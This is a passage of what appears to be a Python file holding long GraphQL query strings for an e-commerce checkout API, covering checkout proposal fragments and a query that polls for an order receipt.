MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# ── GraphQL document: poll receipt ───────────────────────────────────────────
QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails 